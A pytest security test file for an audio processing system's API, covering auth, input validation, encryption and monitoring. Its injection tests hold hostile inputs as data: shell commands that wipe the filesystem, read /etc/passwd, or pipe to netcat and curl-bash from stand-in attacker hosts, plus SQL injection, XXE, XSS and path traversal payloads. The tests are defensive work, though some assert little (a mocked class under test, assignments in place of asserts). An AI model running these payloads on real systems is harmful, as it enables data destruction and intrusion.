"""
Security tests for the Audio Processing System.
"""
import pytest
import json
import base64
import hashlib
import time
from unittest.mock import Mock, patch, AsyncMock
from typing import Dict, Any


class TestAuthenticationSecurity:
    """Security tests for authentication mechanisms."""
    
    @pytest.mark.security
    def test_api_requires_authentication(self):
        """Test that API endpoints require authentication."""
        
        with patch('api.auth.AuthenticationMiddleware') as MockAuth:
            mock_auth = MockAuth.return_value
            mock_auth.verify_token.return_value = False
            
            from api.rest_api import AudioProcessingAPI
            
            api = AudioProcessingAPI({})
            
            # Test unauthenticated request
            with pytest.raises(Exception, match="Authentication required"):
                api.handle_request_without_auth("/api/features/real-time")
    
    @pytest.mark.security
    def test_jwt_token_validation(self):
        """Test JWT token validation."""
        
        with patch('api.auth.jwt') as mock_jwt:
            # Valid token
            mock_jwt.decode.return_value = {
                "user_id": "test_user",
                "exp": int(time.time()) + 3600,  # 1 hour from now
                "permissions": ["read_features"]
            }
            
            from api.auth import JWTValidator
            
            validator = JWTValidator("secret_key")
            
            # Test valid token
            result = validator.validate_token("valid.jwt.token")
            assert result["valid"] is True
            assert result["user_id"] == "test_user"
            
            # Test expired token
            mock_jwt.decode.side_effect = Exception("Token expired")
            
            result = validator.validate_token("expired.jwt.token")
            assert result["valid"] is False
    
    @pytest.mark.security
    def test_role_based_access_control(self):
        """Test role-based access control."""
        
        from api.auth import RoleBasedAccessControl
        
        rbac = RoleBasedAccessControl()
        
        # Define test roles and permissions
        rbac.add_role("viewer", ["read_features"])
        rbac.add_role("operator", ["read_features", "write_features"])
        rbac.add_role("admin", ["read_features", "write_features", "manage_system"])
        
        # Test permission checks
        assert rbac.check_permission("viewer", "read_features") is True
        assert rbac.check_permission("viewer", "write_features") is False
        assert rbac.check_permission("admin", "manage_system") is True
    
    @pytest.mark.security
    def test_api_rate_limiting(self):
        """Test API rate limiting protection."""
        
        with patch('api.middleware.RateLimiter') as MockRateLimiter:
            mock_limiter = MockRateLimiter.return_value
            
            # First requests should pass
            mock_limiter.is_allowed.return_value = True
            
            from api.middleware import RateLimitMiddleware
            
            middleware = RateLimitMiddleware(requests_per_minute=60)
            
            # Simulate multiple requests from same IP
            client_ip = "192.168.1.100"
            
            for i in range(50):
                result = middleware.check_rate_limit(client_ip)
                assert result["allowed"] is True
            
            # Exceed rate limit
            mock_limiter.is_allowed.return_value = False
            
            result = middleware.check_rate_limit(client_ip)
            assert result["allowed"] is False
            assert "rate limit exceeded" in result["message"].lower()


class TestInputValidationSecurity:
    """Security tests for input validation and sanitization."""
    
    @pytest.mark.security
    def test_json_payload_validation(self, sample_audio_data):
        """Test JSON payload validation against malicious inputs."""
        
        from schemas.validation import AudioMessageValidator
        
        validator = AudioMessageValidator()
        
        # Test normal payload
        assert validator.validate(sample_audio_data) is True
        
        # Test oversized payload
        oversized_payload = sample_audio_data.copy()
        oversized_payload["audio_data"] = "x" * (10 * 1024 * 1024)  # 10MB
        
        with pytest.raises(ValueError, match="Payload too large"):
            validator.validate(oversized_payload)
        
        # Test malicious JSON with deeply nested objects
        malicious_payload = sample_audio_data.copy()
        nested_data = {"level": 1}
        for i in range(100):  # Create 100 levels of nesting
            nested_data = {"level": i + 2, "nested": nested_data}
        malicious_payload["malicious_nested"] = nested_data
        
        with pytest.raises(ValueError, match="Nesting too deep"):
            validator.validate(malicious_payload)
    
    @pytest.mark.security
    def test_sql_injection_prevention(self, mock_database_session):
        """Test SQL injection prevention."""
        
        malicious_inputs = [
            "'; DROP TABLE features; --",
            "1' OR '1'='1",
            "admin'/**/OR/**/1=1#",
            "'; UPDATE features SET data='hacked'; --"
        ]
        
        with patch('database.queries.FeatureQuery') as MockQuery:
            mock_query = MockQuery.return_value
            mock_query.get_features_by_sensor_id.return_value = []
            
            from database.queries import FeatureQuery
            
            query = FeatureQuery(mock_database_session)
            
            for malicious_input in malicious_inputs:
                # Query should handle malicious input safely
                result = query.get_features_by_sensor_id(malicious_input)
                
                # Verify parameterized queries are used
                call_args = mock_query.get_features_by_sensor_id.call_args
                assert call_args is not None
                
                # Should return empty result for non-existent sensor
                assert result == []
    
    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test command injection prevention in system operations."""
        
        malicious_commands = [
            "sensor_001; rm -rf /",
            "sensor_001 && cat /etc/passwd",
            "sensor_001 | nc attacker.com 4444",
            "$(curl evil.com/script.sh | bash)"
        ]
        
        with patch('subprocess.run') as mock_subprocess:
            from system.operations import SystemOperations
            
            ops = SystemOperations()
            
            for malicious_cmd in malicious_commands:
                with pytest.raises(ValueError, match="Invalid characters in input"):
                    ops.restart_algorithm_pod(malicious_cmd)
                
                # Subprocess should not be called with malicious input
                mock_subprocess.assert_not_called()
    
    @pytest.mark.security
    def test_xml_external_entity_prevention(self):
        """Test XXE (XML External Entity) attack prevention."""
        
        # Malicious XML with external entity
        malicious_xml = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <sensor>
          <id>&xxe;</id>
          <data>test</data>
        </sensor>"""
        
        with patch('xml.etree.ElementTree.parse') as mock_xml_parse:
            from data_processing.xml_parser import SafeXMLParser
            
            parser = SafeXMLParser()
            
            with pytest.raises(ValueError, match="External entities not allowed"):
                parser.parse_sensor_config(malicious_xml)
            
            # XML parser should be configured to disable external entities
            mock_xml_parse.assert_not_called()


class TestDataEncryptionSecurity:
    """Security tests for data encryption and protection."""
    
    @pytest.mark.security
    def test_audio_data_encryption(self, sample_audio_data):
        """Test audio data encryption in transit and at rest."""
        
        from security.encryption import AudioDataEncryption
        
        encryption = AudioDataEncryption()
        
        # Test encryption
        encrypted_data = encryption.encrypt_audio_data(sample_audio_data["audio_data"])
        
        assert encrypted_data != sample_audio_data["audio_data"]
        assert len(encrypted_data) > len(sample_audio_data["audio_data"])
        
        # Test decryption
        decrypted_data = encryption.decrypt_audio_data(encrypted_data)
        assert decrypted_data == sample_audio_data["audio_data"]
    
    @pytest.mark.security
    def test_sensitive_data_masking(self, sample_feature_type_a):
        """Test sensitive data masking in logs and responses."""
        
        from security.data_masking import DataMasker
        
        masker = DataMasker()
        
        # Add sensitive data to feature
        sensitive_feature = sample_feature_type_a.copy()
        sensitive_feature["user_id"] = "user12345"
        sensitive_feature["location"] = {"lat": 40.7128, "lon": -74.0060}
        sensitive_feature["phone_number"] = "+1-555-123-4567"
        
        # Test data masking
        masked_data = masker.mask_sensitive_data(sensitive_feature)
        
        assert masked_data["user_id"] == "user***45"
        assert masked_data["phone_number"] == "+1-555-***-***7"
        assert "lat" not in str(masked_data["location"])  # Location should be removed
    
    @pytest.mark.security
    def test_database_encryption_at_rest(self, test_config):
        """Test database encryption at rest."""
        
        with patch('database.encryption.FieldEncryption') as MockEncryption:
            mock_encryption = MockEncryption.return_value
            mock_encryption.encrypt_field.return_value = "encrypted_value"
            mock_encryption.decrypt_field.return_value = "original_value"
            
            from database.models import EncryptedFeature
            
            # Test encrypted model
            feature = EncryptedFeature()
            feature.sensitive_data = "original_value"
            
            # Data should be encrypted before storage
            encrypted_value = feature.get_encrypted_sensitive_data()
            assert encrypted_value == "encrypted_value"
            
            # Data should be decrypted when retrieved
            decrypted_value = feature.get_decrypted_sensitive_data()
            assert decrypted_value == "original_value"


class TestNetworkSecurity:
    """Security tests for network communications."""
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_tls_certificate_validation(self):
        """Test TLS certificate validation for external connections."""
        
        with patch('ssl.create_default_context') as mock_ssl:
            mock_context = Mock()
            mock_ssl.return_value = mock_context
            
            from network.secure_client import SecureHTTPClient
            
            client = SecureHTTPClient()
            
            # Test connection to external service
            await client.connect("https://external-api.example.com")
            
            # Verify SSL context is configured securely
            mock_context.check_hostname = True
            mock_context.verify_mode = True
    
    @pytest.mark.security
    def test_rabbitmq_secure_connection(self, test_config):
        """Test secure RabbitMQ connection configuration."""
        
        with patch('message_broker.connection.aiormq') as mock_aiormq:
            from message_broker.connection import SecureMessageBrokerConnection
            
            # Configure secure connection
            secure_config = test_config["rabbitmq"].copy()
            secure_config.update({
                "ssl": True,
                "ssl_verify": True,
                "ssl_cert_path": "/certs/client.crt",
                "ssl_key_path": "/certs/client.key",
                "ssl_ca_path": "/certs/ca.crt"
            })
            
            broker = SecureMessageBrokerConnection(secure_config)
            
            # Connection should use SSL/TLS
            assert broker.ssl_enabled is True
            assert broker.ssl_verify is True
    
    @pytest.mark.security
    def test_network_traffic_filtering(self):
        """Test network traffic filtering and firewall rules."""
        
        from network.security import NetworkSecurityFilter
        
        security_filter = NetworkSecurityFilter()
        
        # Test allowed IPs
        allowed_ips = ["10.0.1.0/24", "192.168.1.0/24"]
        blocked_ips = ["192.168.2.100", "172.16.0.50"]
        
        security_filter.configure_allowed_networks(allowed_ips)
        
        # Test IP filtering
        assert security_filter.is_ip_allowed("10.0.1.50") is True
        assert security_filter.is_ip_allowed("192.168.1.100") is True
        assert security_filter.is_ip_allowed("192.168.2.100") is False
        assert security_filter.is_ip_allowed("172.16.0.50") is False


class TestVulnerabilityTesting:
    """Tests for common security vulnerabilities."""
    
    @pytest.mark.security
    def test_cross_site_scripting_prevention(self):
        """Test XSS (Cross-Site Scripting) prevention."""
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        from api.sanitization import InputSanitizer
        
        sanitizer = InputSanitizer()
        
        for payload in xss_payloads:
            # Input should be sanitized
            sanitized = sanitizer.sanitize_input(payload)
            
            # Verify dangerous characters are escaped or removed
            assert "<script>" not in sanitized
            assert "javascript:" not in sanitized
            assert "onerror=" not in sanitized
            assert "alert(" not in sanitized
    
    @pytest.mark.security
    def test_cross_site_request_forgery_prevention(self):
        """Test CSRF (Cross-Site Request Forgery) prevention."""
        
        with patch('api.middleware.CSRFProtection') as MockCSRF:
            mock_csrf = MockCSRF.return_value
            mock_csrf.generate_token.return_value = "csrf_token_12345"
            mock_csrf.validate_token.return_value = True
            
            from api.middleware import CSRFMiddleware
            
            middleware = CSRFMiddleware()
            
            # Test CSRF token generation
            token = middleware.generate_csrf_token("session_id_123")
            assert token == "csrf_token_12345"
            
            # Test CSRF token validation
            is_valid = middleware.validate_csrf_token("session_id_123", "csrf_token_12345")
            assert is_valid is True
            
            # Test invalid token
            mock_csrf.validate_token.return_value = False
            is_valid = middleware.validate_csrf_token("session_id_123", "invalid_token")
            assert is_valid is False
    
    @pytest.mark.security
    def test_directory_traversal_prevention(self):
        """Test directory traversal attack prevention."""
        
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fhome",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        from api.file_handler import SecureFileHandler
        
        file_handler = SecureFileHandler("/app/data/")
        
        for malicious_path in malicious_paths:
            with pytest.raises(ValueError, match="Path traversal detected"):
                file_handler.read_file(malicious_path)
    
    @pytest.mark.security
    def test_insecure_deserialization_prevention(self):
        """Test insecure deserialization prevention."""
        
        # Malicious pickle payload (simplified example)
        malicious_payload = base64.b64encode(b"malicious_pickle_data").decode()
        
        from data_processing.serialization import SecureDeserializer
        
        deserializer = SecureDeserializer()
        
        # Should reject pickle deserialization
        with pytest.raises(ValueError, match="Unsafe deserialization method"):
            deserializer.deserialize(malicious_payload, format="pickle")
        
        # Should only allow safe formats
        safe_json = json.dumps({"data": "safe"})
        result = deserializer.deserialize(safe_json, format="json")
        assert result["data"] == "safe"
    
    @pytest.mark.security
    def test_timing_attack_prevention(self):
        """Test timing attack prevention in authentication."""
        
        from api.auth import SecureAuthentication
        
        auth = SecureAuthentication()
        
        # Test authentication timing consistency
        start_time = time.time()
        auth.authenticate("valid_user", "wrong_password")
        invalid_auth_time = time.time() - start_time
        
        start_time = time.time()
        auth.authenticate("nonexistent_user", "password")
        nonexistent_user_time = time.time() - start_time
        
        # Authentication times should be similar to prevent timing attacks
        time_diff = abs(invalid_auth_time - nonexistent_user_time)
        assert time_diff < 0.1, f"Timing difference too large: {time_diff}s"


class TestSecurityMonitoring:
    """Tests for security monitoring and alerting."""
    
    @pytest.mark.security
    def test_suspicious_activity_detection(self):
        """Test detection of suspicious activities."""
        
        from security.monitoring import SecurityMonitor
        
        monitor = SecurityMonitor()
        
        # Test multiple failed login attempts
        for i in range(10):
            monitor.log_failed_login("192.168.1.100", f"attempt_{i}")
        
        # Should trigger suspicious activity alert
        alerts = monitor.get_active_alerts()
        assert len(alerts) > 0
        assert any("multiple failed logins" in alert["message"].lower() for alert in alerts)
    
    @pytest.mark.security
    def test_anomaly_detection(self, sample_audio_data):
        """Test anomaly detection in data patterns."""
        
        from security.anomaly_detection import AnomalyDetector
        
        detector = AnomalyDetector()
        
        # Train with normal patterns
        normal_patterns = []
        for i in range(100):
            pattern = {
                "message_size": len(json.dumps(sample_audio_data)),
                "timestamp": time.time(),
                "sensor_id": f"sensor_{i % 10}"
            }
            normal_patterns.append(pattern)
        
        detector.train(normal_patterns)
        
        # Test anomalous pattern
        anomalous_pattern = {
            "message_size": len(json.dumps(sample_audio_data)) * 100,  # 100x larger
            "timestamp": time.time(),
            "sensor_id": "unknown_sensor"
        }
        
        is_anomaly = detector.is_anomaly(anomalous_pattern)
        assert is_anomaly is True
    
    @pytest.mark.security
    def test_security_audit_logging(self):
        """Test security audit logging."""
        
        with patch('logging.getLogger') as mock_logger:
            mock_security_logger = Mock()
            mock_logger.return_value = mock_security_logger
            
            from security.audit import SecurityAuditor
            
            auditor = SecurityAuditor()
            
            # Test various security events
            auditor.log_authentication_success("user123", "192.168.1.100")
            auditor.log_authentication_failure("user123", "192.168.1.100")
            auditor.log_authorization_failure("user123", "admin_action")
            auditor.log_data_access("user123", "features_table")
            
            # Verify all events are logged
            assert mock_security_logger.info.call_count >= 2
            assert mock_security_logger.warning.call_count >= 2 